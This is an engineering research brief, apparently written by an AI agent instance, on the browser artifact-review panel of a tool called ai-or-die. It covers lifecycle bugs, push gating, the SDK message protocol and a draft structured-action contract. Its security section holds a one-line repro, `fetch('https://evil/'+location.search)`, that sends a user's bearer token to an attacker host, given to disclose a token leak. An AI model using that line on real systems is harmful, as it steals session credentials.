# Artifact Panel v2 — Consumer-Side Research & Design Brief

Status: research (read-only). Freshness: main @ `68ef947` (2026-07-02). Author: implementer instance.
Scope: the ai-or-die CONSUMER side of the artifact-review loop — browser panel, injected
SDK, server push routes, bridge injection. Producer side (github-router MCP tools + plan→HTML
renderer + skill) is a separate instance; §7 is the seam to converge with it.

Background ADRs: `docs/adrs/0033-remote-artifact-review.md` (the loop), `docs/adrs/0035-artifact-panel-maximized-split-and-push.md` (split layout + idle-gated push).

Files in scope (line counts): `src/public/artifact-panel.js` (700), `src/artifact-sdk-client.js` (564),
`src/artifact-review.js` (1088), `src/base-bridge.js` (831), `src/public/components/artifact-panel.css` (271),
`src/server.js` (push wiring), `src/control/jsonl-awaiting.js` (173), `test/control/artifact-routes.test.js` (466).

---

## 0. Executive summary

The loop works but is **half push-based, structurally free-text-only, and carries one real token-leak**.

- **agent→human is push (two overlapping paths, SSE + WS — they double-render replies).**
- **human→agent is push only under a heuristic idle gate** that keys on PTY output-quietness and
  *ignores the transcript "awaiting user input" signal that already exists in-repo* (`detectAwaiting`).
  The worst injection case (a pending ExitPlanMode / AskUserQuestion / permission menu) is exactly
  when the PTY is quiet, so the current gate is most likely to misfire precisely when it is most harmful.
- **Every feedback channel is free text.** The SDK captures annotate-a-block / comment-on-selection
  and flattens to a prompt string. There is **no structured action/button/plan-step channel** in any
  layer (SDK → panel → server → agent). This is the biggest v2 gap.
- **Client-side lifecycle has concrete data-loss and UX dead-ends:** dismiss (×) is a one-way hide with
  no re-open; tab-switch silently clears the queued pills and wipes chat history; background-tab agent
  replies are dropped; SSE reconnect loses replies delivered during the gap.
- **Security:** the panel loads the artifact iframe with the user's **bearer token in the URL query**
  (`?token=<bearer>`) under `sandbox="allow-scripts allow-same-origin"`, so artifact JS can read
  `location.search` and exfiltrate the full bearer. Treat as Critical for any non-trusted artifact.
- **Tests:** the router + push-gate *logic* is well covered; the client panel, the SDK, SSE handling,
  double-delivery, and the whole interactivity surface are **untested**.

---

## 1. Lifecycle: mount / show / hide / dismiss / end

### Mount
- `ArtifactPanel` is constructed lazily once per page in `src/public/app.js:255` (guarded by the script
  having loaded). DOM built in `_buildDom` (`artifact-panel.js:95`) and appended to `.terminal-wrapper`
  (`artifact-panel.js:147-148`). One panel instance is shared across all tabs; only `activeSessionId`
  renders (`reviews` Map keyed by sessionId, `artifact-panel.js:48,55`).

### Open / show
- Server broadcasts `artifact_review_opened` on agent `artifact_open` (`artifact-review.js:740-747`) →
  WS dispatch `app.js:2849-2851` → `panel.open(message)` (`artifact-panel.js:352-364`). `open` stores the
  review with a **client-token** viewUrl (rebuilt from the browser's own bearer, never the broadcast's),
  and if it is the active session calls `_show` (`362`).
- `_show` (`402-417`): on a session change it wipes `_chatLog.innerHTML=''` and `_clearQueue()`, sets the
  iframe `src`, connects SSE, `el.hidden=false`, then `_clampToBounds()`.

### Refresh / reload — **control EXISTS**
- Header reload button `↻` (`artifact-panel.js:101,105`) → `reload()` (`430-437`): cache-busts the iframe
  `src` with `&_r=<ms>`. Preserves `_queue` (queue lives in the panel, not the iframe) and scroll is
  replayed on load (`_onIframeLoad`, `447-455`).
- Server-driven auto-reload: chokidar watches the artifact file (`artifact-review.js:690-712`), on a
  settled write broadcasts `artifact_review_reload` → `app.js:2857` → `reloadReview` (`441-445`) →
  `reload()`. Only the ACTIVE tab reloads.

### Dismiss — **control EXISTS but is a one-way dead-end (BUG)**
- Header `×` (`artifact-panel.js:104,108`) → `collapse()` (`422`): sets `_collapsed=true`, `_hide()`
  (hides + tears down SSE), emits state. **It does NOT POST `/end`, does NOT notify the agent, and there
  is no UI affordance to re-open a collapsed panel for the same session.** `expand()` (`423-427`) exists
  but nothing in the panel chrome calls it. Once dismissed, the only way the panel returns is a fresh
  server `artifact_review_opened` (agent re-opens) or a session switch that re-`_show`s. See §5-bug-4.

### End (`/end`) — end-to-end (agent-driven only)
- `POST /:sessionId/end` (`artifact-review.js:965-972`): sets `review.status='ended'`, `stopWatch`,
  emits `ended`, broadcasts `artifact_review_ended`.
- SSE `onEnded` (`933-938`) pushes an `ended` event then `res.end()`. Poll returns `next_step:'ended'`
  (`989-991`).
- Client: WS `artifact_review_ended` → `app.js:2853` → `endReview` (`366-373`): deletes the review,
  tears down SSE, clears queue, hides. SSE `ended` handler also calls `endReview` (`673`).
- **Who calls `/end`?** Only the agent side (github-router `artifact_*` tools) or curl. The panel `×`
  does **not**. So "end" is entirely producer-driven; the human has no button to end a review.

### Queued feedback across refresh / dismiss / reconnect
- **Refresh (reload):** `_queue` survives (panel-owned); the iframe's in-flight annotation card is lost
  (acceptable). Fine.
- **Dismiss (collapse):** does not clear the queue (only hides). But it also cannot be re-shown, so the
  queue is effectively stranded until a re-open.
- **Tab switch:** `notifyActiveSessionChanged` (`387-393`) unconditionally `_clearQueue()` → **queued but
  unsent pills are silently dropped** (§5-bug-3). `_show` also wipes `_chatLog` on session change and
  never rehydrates from server `review.chat` → **chat history lost** (§5-bug-2).
- **SSE reconnect:** `EventSource` auto-retries, but there is **no `Last-Event-ID` replay**; agent
  replies delivered during the gap are lost (server keeps `review.chat` but never re-sends it). Presence
  flaps connected=false/true (`artifact-review.js:959-962`). See §5-bug-5.

---

## 2. Push in both directions

### agent → human (push; but DOUBLE path)
- Agent posts `POST /:sessionId/agent-reply` (`artifact-review.js:1060-1070`) → `addAgentReply`
  (`298-312`) appends `review.chat`, emits `agent-reply`, AND `broadcastToSession('artifact_agent_reply')`.
- **Path A (SSE):** `events` stream `onAgentReply` (`925-928`) → panel SSE listener (`artifact-panel.js:655-662`)
  → `_appendChat('agent', …)` + forward to iframe.
- **Path B (WS):** `artifact_agent_reply` → `app.js:2861` → `agentReply` (`375-385`) → `_appendChat` +
  forward to iframe.
- **Both fire when the panel is shown** (SSE connected AND WS live) → the reply renders twice. See §5-bug-1.

### human → agent (queue + long-poll + idle-gated push)
- **Queue/poll (durable source of truth):** `POST /prompts` (`artifact-review.js:836-890`) → `queuePrompts`
  → emits `feedback`; `GET /poll` long-holds (`974-1058`) and delivers, destructive-read via
  `ackFeedback`. Active-poll count tracked in `activePolls` (`666-671`).
- **Idle push (ADR-0035, default ON):** in `POST /prompts`, if `pushToAgent` is wired AND no poll is in
  flight (`hadActivePoll` snapshot `847`), it claims the feedback (`ackFeedback`, `868`) then calls
  `pushToAgent(sessionId, text)` (`870-872`) with a 4s race timeout; on failure re-queues to the FRONT
  (`restoreClaimedFeedback`, `877-881`).
- **Server hook** `_pushArtifactFeedbackToAgent` (`server.js:4138-4155`): finds the bridge via
  `_bridgeForSession` (`4118-4130`), applies the **second gate** — `msSinceLastOutput(sessionId)` must
  exceed `_artifactPushQuietMs` (default 1500ms, `server.js:176`) — then injects `buildArtifactPushPayload`
  (bracketed-paste + trailing CR) via `bridge.sendInput`.
- Wiring: router built at `server.js:1273-1284`; `pushToAgent` passed only when
  `artifactPushEnabledFromEnv(process.env.AIORDIE_ARTIFACT_PUSH)` (`server.js:174,1281-1283`).
- **1:1 identity confirmed:** the artifact review sessionId is `AIORDIE_SESSION_ID`
  (`server.js:4612`), which is the same value used as the bridge PTY session id in `bridge.sendInput`.
  Env trio injected at spawn in `_artifactEnvForSession` (`server.js:4607-4617`); the JSONL binding
  sidecar `AIORDIE_CLAUDE_BIND` is set alongside (`server.js:4676`, `5333`).

### CRITICAL — residual risk of the idle gate (ADR-0035) and a concrete hardening

**The gate today is `!hadActivePoll` (router) AND `msSinceLastOutput > 1500ms` (server).** Neither proves
the agent is idle *at a free-text prompt*:

1. A mid-turn-but-silent agent (thinking, or blocked on a slow tool) has a quiet PTY → the gate passes →
   a bracketed-paste injection races the TUI. ADR-0035 accepts this as "likely deferred, not corrupted"
   because Claude Code buffers stdin.
2. **The far worse case the ADR under-weights:** when the CLI is sitting on a *user-facing menu*
   (ExitPlanMode plan approval, AskUserQuestion, a permission prompt), the PTY is **maximally quiet** —
   so the gate is *most* likely to fire — and a bracketed-paste + CR will submit the human's free-text
   note straight into the menu (selecting an arbitrary option / answering the wrong question). This is a
   correctness-and-safety failure, not a cosmetic interleave.

**The signal to fix it already exists and is unused by the push path.** `src/control/jsonl-awaiting.js`
`detectAwaiting(file)` (`12-42`) reads the bounded tail of the Claude JSONL transcript and returns a
non-null descriptor `{ pendingUserFacingTool: 'ExitPlanMode'|'AskUserQuestion'|'permission', awaitingPrompt?, awaitingOptions? }`
whenever the last assistant turn left a user-facing `tool_use` with no matching `tool_result`
(`23-38`, `81-119`). It is already called for control/session-status at `server.js:4303` and `5045`
(via `_controlDetectAwaitingCached`, `4299-4307`) — but **the artifact push gate does not consult it at
all**. The binding is deterministic (ADR-0026), bounded (256 KB tail), fail-safe (returns null on any
error), and reflects *semantic* turn state rather than *render timing* — strictly better than PTY-quiet.

**Proposed hardening (consumer side, small + testable):** make the transcript the PRIMARY gate in
`_pushArtifactFeedbackToAgent`:
- Resolve the session's JSONL binding (same `this._stickyJsonl.get(sessionId)` path as `5044`).
- If `detectAwaiting(binding.file)` returns **non-null** → a user-facing tool is pending → **HARD-DECLINE
  the push** (leave it queued for `artifact_poll`, or, better, route it to the structured `respond` path
  — see §4/§7). Never bracketed-paste into a menu.
- Positive idle signal: only push when the transcript's last non-sidechain event is an assistant turn
  with no unresolved `tool_use` (i.e. the turn is complete and the CLI is at the free-text prompt). This
  is a small extension of `detectAwaiting` (add a `turnComplete`/`idleAtPrompt` classification).
- Keep `msSinceLastOutput > quiet` as a cheap secondary guard (covers the render-in-progress window and
  the no-binding fallback, e.g. raw `claude.exe` whose project slug doesn't resolve — same fallback shape
  already used at `server.js:5050`).
- Cache the read (the control path already caches for 1s at `4302`) so per-`/prompts` cost is bounded.

This tightens ADR-0035's "follow-up" that the ADR itself names (0035 lines 74-78) into a concrete gate.

---

## 3. SDK protocol (`src/artifact-sdk-client.js`) — every postMessage type

Source strings: iframe→panel is `source:'ai-or-die-artifact-sdk'` (`SDK_SOURCE_IN`); panel→iframe is
`source:'ai-or-die-artifact-host'` (`HOST_SOURCE_OUT`). Panel authenticates the iframe by
`event.source === iframe.contentWindow` (`artifact-panel.js:464`); the SDK authenticates the host by
`event.source === window.parent` and a sessionId match (`artifact-sdk-client.js:433-441`).

### iframe → panel (SDK emits)
| type | payload | emitted at | panel handler |
|---|---|---|---|
| `artifact-ready` | `{ domSnapshot }` | `563` | `artifact-panel.js:469-473` sets `review.ready` |
| `artifact-annotation-queued` | `{ annotation }` | `283` | `474-477` → `_enqueueAnnotation` (pill) |
| `artifact-annotations-send` | `{ domSnapshot }` | `287` | `478-481` → `_sendQueue` |
| `artifact-snapshot` | `{ domSnapshot }` | `450` (reply) | `482-491` flushes pending snapshot send |
| `artifact-scroll` | `{ x, y }` | `473` | `492-496` stores scroll for reload replay |
| `artifact-prompts` (legacy) | `{ prompts, domSnapshot }` | `529` | `502-509` POSTs `/prompts` immediately |
| `artifact-layout-warnings` (legacy) | `{ layout_warnings }` | `538` | `510-514` POSTs `/layout-warnings` |

### panel → iframe (host sends)
| type | payload | sent at | SDK handler |
|---|---|---|---|
| `set-annotation-mode` | `{ enabled }` | `454` | `443-445` toggles annotate mode + cursor CSS |
| `request-snapshot` | `{}` | `571` | `446-451` replies `artifact-snapshot` |
| `restore-scroll` | `{ x, y }` | `453` | `452-455` `window.scrollTo` |
| `agent-reply` | `{ text }` | `381,659` | `456-458` dispatches `ai-or-die-artifact-agent-reply` CustomEvent |
| `presence` | `{ …presence }` | `671` | `459-461` dispatches `ai-or-die-artifact-presence` CustomEvent |

### Annotation capture
- **Click a block:** capture-phase `click` (`494,502-511`) → `showAnnotationCard(target)`.
- **Select text:** capture-phase `mouseup` (`494-500`) → `textSelectionContext` (`171-202`) → card with a
  text-range `target` (selector + start/end boundaries `162-169`).
- The shadow-DOM card (`363-429`): textarea; **Enter queues**, **Cmd/Ctrl+Enter sends the batch now**,
  **Esc cancels** (`414-427`). Queue is panel-owned; the SDK only emits intents.
- Annotation object (`buildAnnotation`, `290-301`): `{ uid, selector, tag, text, prompt, sourceLine?, target? }`.
  `sourceLine` comes from the nearest `data-source-line` ancestor (`118-128`) — the renderer's source map.

### Interactive controls today
- **None.** `isInteractiveControl` (`209-217`) deliberately EXCLUDES native `button/input/select/textarea/
  option/label/summary/[contenteditable]` from annotation so they "behave natively" (`219-221`) — but
  there is **no channel for those native controls to post anything back to the agent**. The only feedback
  primitive is annotate + free-text comment. No buttons, no forms, no action callbacks, no typed events.

---

## 4. Interactivity gaps — what buttons + interactive plan steps require

Goal: an artifact declares **actions** (buttons) and **plan steps** (approve / edit / check) that post
**structured** events the agent receives as typed data, not prose.

The transport (queue → poll → idle-push, destructive-read, SSE reply) is reusable as-is. What is missing
is a **typed lane end to end**:

1. **Declaration (producer + SDK).** Let the artifact mark actionable elements. Two viable styles:
   - Declarative DOM: `data-aod-action="approve"`, `data-aod-value=…`, `data-aod-plan-step="3"`,
     `data-aod-kind="approve|edit|check"`. SDK scans/listens for these.
   - JS API: extend `window.aiOrDieArtifact` (`545-560`) with `action(id, payload)` /
     `declareActions(manifest)`.
   Either way the SDK must **not** suppress these via `isInteractiveControl`; it needs a dedicated
   listener that fires on the declared controls and posts a structured message instead of opening the
   comment card.

2. **New SDK→panel message** (proposed): `artifact-action`
   `{ actionId, kind, value, stepId?, edit?, context, domSnapshot? }`. Panel forwards it to a typed
   server route. Plan-step controls post `{ stepId, kind:'approve'|'reject'|'edit', edit?:string }`.

3. **New / extended server route.** Either a new `POST /:sessionId/actions` or a typed variant of
   `/prompts` that keeps actions **distinct from free-text prompts**. Today `queuePrompts` stores opaque
   items and `formatFeedbackForAgent` (`artifact-review.js:106-124`) flattens everything to a text block —
   that lossy flatten is exactly what a structured channel must avoid. The poll payload
   (`pollPayload`, `607-621`) needs an `actions:[…]` field parallel to `prompts`.

4. **Agent-side typing (producer seam).** `artifact_poll` must surface the structured actions as typed
   tool output (e.g. `{ prompts:[…], actions:[{stepId, kind, edit}] }`) so the agent branches on the
   decision rather than parsing English. This is the frozen-contract boundary with the github-router
   instance (§7).

5. **Idle-push interaction.** A structured approve/reject should NOT be bracketed-pasted as free text.
   When a plan-approval action arrives and the transcript shows a pending `ExitPlanMode`
   (`detectAwaiting` → `pendingUserFacingTool:'ExitPlanMode'`), the right move is the **structured respond
   path** (`_controlRespond`, `server.js:5037+`, which already maps a choice to the pending tool), not a
   PTY paste. This ties §2's hardening and §4's action lane together: the transcript signal both blocks
   the wrong injection and *routes* the right structured response.

---

## 5. Reliability / correctness bugs (concrete, with repro)

1. **Double agent-reply render (Important).** SSE `onAgentReply` (`artifact-panel.js:655-662`) and WS
   `agentReply` (`375-385`) both `_appendChat` when the panel is shown. Repro: agent calls
   `artifact_reply` with the panel open → the reply appears twice. Fix: pick one channel (WS is redundant
   with SSE while shown), or de-dupe by a reply id/timestamp (`review.chat` entries already carry `at`).

2. **Chat history wiped on tab switch / re-show (Important).** `_show` (`405-410`) does
   `_chatLog.innerHTML=''` on session change; server keeps `review.chat` (`298-312`) but never
   rehydrates. Repro: switch away and back → chat empty though replies exist server-side. Fix: add a
   `GET /:sessionId/history` (or include chat in an SSE hello) and repaint on `_show`.

3. **Queued annotations silently dropped on tab switch (Important, data loss).**
   `notifyActiveSessionChanged` (`387-393`) unconditionally `_clearQueue()`. Repro: queue two pills,
   switch tab, switch back → pills gone, never sent. Fix: keep the queue per-session in the `reviews` Map,
   not in a single shared `_queue`.

4. **Dismiss (×) is a one-way dead-end (Important, UX).** `collapse()` (`422`) hides with no re-open
   affordance and does not notify the agent/end the review. Repro: click × → panel gone; no button brings
   it back for that session; the agent still believes the review is open. Fix: add a re-open affordance
   (a pill/badge) wired to `expand()`, and/or a real "End review" action that POSTs `/end`.

5. **SSE reconnect loses replies + flaps presence (Important).** No `Last-Event-ID` replay
   (`events`, `903-963`); a reply delivered during a dropped SSE is lost. Repro: network blip during an
   agent reply. Fix: buffer `review.chat` with monotonic ids and replay on `(re)connect`.

6. **Background-tab replies dropped entirely (Important).** WS `agentReply` no-ops unless
   `sessionId === activeSessionId` (`artifact-panel.js:379`), and SSE only connects for the active
   session (`_connectSse`, `645-674`). Repro: tab A review open, switch to tab B, agent in A replies →
   A's chat never gets it, even after switching back (see bug 2). Fix: persist per-session chat and
   rehydrate.

7. **Presence is fake (Important).** `'working'/'listening'` is purely client-optimistic — set on send
   (`591`), cleared on reply or POST-settle (`607`). The server never pushes real agent turn-state; SSE
   `presence` only carries `{connected,lastSeen}` and never sets `presence.state` (`929-932`,
   `artifact-review.js:314-322`). Repro: send a note, agent is actually busy on another turn → panel says
   "Listening"; or agent replies out-of-band → stale "Working…". Fix: derive real presence from the
   transcript turn/awaiting signal (§2) and push it over SSE as `presence.state`.

8. **Note composer has no failure recovery (Important, inconsistent).** `_submitNote` (`615-621`) is
   fire-and-forget: it echoes the note to chat and POSTs, with no queue-restore on failure (unlike
   `_sendQueue`, `600-612`). Repro: type a note, network fails → note is lost though chat shows it as
   sent. Fix: mirror `_sendQueue`'s restore-on-failure.

9. **Bearer token leaks into the artifact iframe (CRITICAL, security).** `_show` sets the iframe `src`
   from `_authUrl('/view', …)` (`357,409`), which appends the user's **bearer** as `?token=<bearer>`
   (`_authUrl`, `339-343` → `authManager.appendAuthToUrl`). The iframe is
   `sandbox="allow-scripts allow-same-origin"` (`artifact-panel.js:115`), so the artifact document runs
   same-origin and can read `location.search` → the full bearer. Repro: an artifact containing
   `fetch('https://evil/'+location.search)` exfiltrates the session bearer; with it an attacker has full
   authed API access. Note the *asset* sub-resources already avoid this by using a per-session HMAC
   path-token (`_auth/<mint(sessionId)>/…`, `artifact-review.js:569-575,810-818`) that is NOT the bearer —
   but `/view` itself is still fetched with the bearer in the URL. Fix: serve `/view` via a one-time view
   ticket / the same scoped path-token pattern instead of `?token=<bearer>`; and/or drop
   `allow-same-origin` if the SDK can be reworked to not need it. **Mandatory adversarial review on this
   one.**

10. **Token-in-asset-path is readable by the artifact (Low).** The scoped asset token sits in the
    artifact's `<base href>` and any artifact script can read `document.baseURI` to reach sibling assets
    under the sandbox base. Bounded to the artifact directory + timing-safe verified (`577-587`), so low
    severity — but worth stating in the threat model alongside bug 9.

11. **Idle-push can fire on a menu (CRITICAL, correctness) — see §2.** The PTY-quiet gate is most likely
    to pass exactly when a user-facing tool menu is up. Repro: agent hits ExitPlanMode; human types a
    note in the composer; push injects it + CR → answers the plan menu. Fix: transcript gate (§2).

12. **Maximized layout minor notes (Suggestion).** The split grid (`artifact-panel.css:216-271`) is CSS-
    only and reverts under 1024px — sound. The iframe is not reloaded on maximize (good, no scroll jump).
    No functional bug found; call out that focus is not moved into the composer on maximize (a11y polish).

---

## 6. Test coverage & gaps

### Present
- **`test/control/artifact-routes.test.js` (466 lines) — strong on router + push-gate logic.** Covers:
  open→view SDK+asset-base injection (`144-167`), markdown shell vs html passthrough (`169-221`),
  prompts→poll-once destructive read (`223-244`), asset traversal 403 (`246-264`), out-of-base file 403
  (`266-280`), poll long-hold-then-resolve (`282-302`), and the push suite (`304-465`):
  `formatFeedbackForAgent` (`305-315`), `artifactPushEnabledFromEnv` default-on/opt-out (`317-326`),
  `buildArtifactPushPayload` ESC/control-byte sanitization + envelope integrity (`328-344`),
  push-consumes-queue when no poll (`346-367`), no-push-while-poll-in-flight (`369-388`), decline leaves
  queue (`390-405`), no-hook unchanged (`407-418`), hung-push timeout restore (`420-435`),
  claim-before-await no-double-deliver (`437-464`).
- **e2e `55-artifact-panel-chrome.spec.js` — ONE test** (`82`): drag / resize / minimize / persistence /
  off-screen clamp. Real-browser chrome only.

### Not the artifact panel
- `53-plan-viewer.spec.js`, `54-plan-detection-pipeline.spec.js` test the **terminal plan-mode detector**
  (the xterm plan indicator + modal, `plan-detector.js`) — a *different* feature, not the artifact panel.
- `17-install-panel.spec.js` is the tool-install UI — unrelated.

### Gaps (what v2 must add)
- **No unit test of `artifact-panel.js` at all** — none of show/hide/dismiss/reload, queue lifecycle,
  SSE agent-reply/presence/ended handling, tab-switch behavior, `_sendQueue` restore-on-failure.
- **No test of the SDK client** (`artifact-sdk-client.js`) — annotate, text-range, host-message auth,
  legacy compat.
- **No test of the server idle gate** `_pushArtifactFeedbackToAgent` (`server.js:4138`) — the
  `msSinceLastOutput` decision is untested (only the router's mocked `pushToAgent` is).
- **No test of `detectAwaiting` in the push path** (it isn't wired — §2).
- **No test of double agent-reply (SSE+WS), chat rehydration, queue-drop-on-switch, dismiss dead-end,
  background-tab replies, reconnect replay** — bugs 1-6.
- **No security test** that the artifact cannot read the bearer / that `/view` auth isn't in the URL — bug 9.
- **Nothing for the interactivity surface** (buttons, plan steps, structured action events) — it doesn't
  exist yet.

v2 target tests: an end-to-end panel test (open → annotate via SDK → send → agent poll+reply → reply
renders once); action-button click → structured event → typed poll payload; plan-step approve → typed +
routed to `respond`; dismiss → re-open; reload preserves per-session queue; reconnect replays chat;
idle-gate declines on a pending user-facing tool.

---

## 7. First-draft WIRE CONTRACT (consumer vantage — to converge with the producer)

Draft only. The producer instance owns the HTML renderer + `artifact_*` tool schemas; these are the
shapes the CONSUMER needs on the wire. Names/fields are proposals, not frozen.

### 7.1 Declarative markup the SDK recognizes (producer emits)
```html
<!-- a button/action -->
<button data-aod-action="rerun" data-aod-value="section-3">Re-run section 3</button>
<!-- an interactive plan step -->
<li data-aod-plan-step="3" data-aod-step-title="Add retry/backoff">
  <button data-aod-action="approve" data-aod-step="3">Approve</button>
  <button data-aod-action="edit"    data-aod-step="3">Edit…</button>
  <input  data-aod-action="check"   data-aod-step="3" type="checkbox">
</li>
```
SDK contract: elements carrying `data-aod-action` are driven natively (not annotated) and, on activation,
post `artifact-action` (below). `data-source-line` continues to carry the renderer source map.

### 7.2 postMessage additions
```jsonc
// iframe -> panel  (source: "ai-or-die-artifact-sdk")
{ "type": "artifact-action", "sessionId", "key",
  "payload": { "actionId": "approve", "kind": "approve|reject|edit|check|custom",
               "stepId": "3", "value": "…", "edit": "…optional user text…",
               "context": { "selector", "sourceLine?", "text" }, "domSnapshot?": {…} } }

// panel -> iframe  (source: "ai-or-die-artifact-host")
{ "type": "action-ack",   "payload": { "actionId", "stepId", "ok": true } }   // optimistic UI confirm
{ "type": "plan-state",   "payload": { "steps": [ { "stepId", "state": "pending|approved|rejected|done" } ] } }
```

### 7.3 Server routes (consumer needs)
```jsonc
// human -> agent, structured (distinct from free-text /prompts)
POST /api/artifact/:sessionId/actions
  body: { actions: [ { actionId, kind, stepId?, value?, edit?, context? } ], domSnapshot? }
  -> { ok, pushed, queued }        // same idle-gate + claim/restore semantics as /prompts,
                                   //   but plan-approval kinds route to the structured respond path,
                                   //   NEVER bracketed-paste (see §2/§4)

// agent -> human, structured turn/presence (make presence real)
GET  /api/artifact/:sessionId/events   // + new SSE events:
  event: presence   data: { state: "idle_at_prompt|working|awaiting_input", pendingTool? }
  event: plan-state data: { steps: [ { stepId, state } ] }

// history replay (fixes chat wipe + reconnect loss)
GET  /api/artifact/:sessionId/history  -> { chat: [ { role, text, at, id } ], plan?: {…} }
```

### 7.4 Typed poll payload (extend `pollPayload`, `artifact-review.js:607`)
```jsonc
{ "status", "next_step",
  "prompts":  [ … ],                       // existing free-text/annotation feedback
  "actions":  [ { "actionId", "kind", "stepId?", "value?", "edit?" } ],   // NEW typed lane
  "layout_warnings?": [ … ], "dom_snapshot?": {…} }
```

### 7.5 Dismiss / refresh / push (consumer-owned)
```jsonc
// dismiss becomes a real, agent-visible action (optional)
POST /api/artifact/:sessionId/end      // wire the panel × to offer "End review" (today agent-only)
// refresh already exists (client cache-bust + chokidar broadcast artifact_review_reload)
// idle push: gate on transcript detectAwaiting() (PRIMARY) + msSinceLastOutput (secondary);
//   plan-approval actions route to /control respond, not PTY paste.
```

### 7.6 Open integration questions for the producer instance
- Does the plan renderer already emit stable `data-aod-plan-step` ids, or must the consumer derive them?
- Should `artifact_poll` return `actions` inline with `prompts`, or a separate `artifact_actions` tool?
- For plan approval, is the agent expected to be sitting on `ExitPlanMode` (route via `respond`), or is
  it a free-turn approval (structured push)? The transcript `detectAwaiting` result disambiguates at
  runtime — align on who inspects it (consumer server does today).
- Presence source of truth: consumer derives `state` from the JSONL transcript; confirm the producer
  does not also try to push presence (avoid a second double-path like agent-reply, §5-bug-1).

---

## Appendix — key file:line index
- Panel lifecycle/DOM: `artifact-panel.js` — build `95-149`, show/hide `402-428`, dismiss `422`,
  reload `430-445`, iframe-msg `458-515`, queue/pills `536-613`, note `615-621`, SSE `645-680`.
- SDK: `artifact-sdk-client.js` — post `43-57`, annotate card `363-429`, host msgs `433-464`,
  pointer `479-511`, legacy API `521-560`.
- Server router: `artifact-review.js` — store `146-337`, push helpers `93-144`, view/asset `750-834`,
  prompts+push `836-890`, events SSE `903-963`, end `965-972`, poll `974-1058`, agent-reply `1060-1070`.
- Push wiring: `server.js` — flags `168-176`, router `1273-1284`, hook `4138-4155`, env trio `4607-4617`,
  awaiting callsites `4303`,`5045`.
- Idle signal: `control/jsonl-awaiting.js` — `detectAwaiting 12-42`, tool map `81-119`.
- Bridge: `base-bridge.js` — `sendInput 551-564`, `msSinceLastOutput 573-577`, `lastOutputAt 326,389`.
- CSS: `components/artifact-panel.css` — base `5-25`, maximized split `216-271`.
- Tests: `test/control/artifact-routes.test.js` `129-466`; e2e `55-artifact-panel-chrome.spec.js:82`.
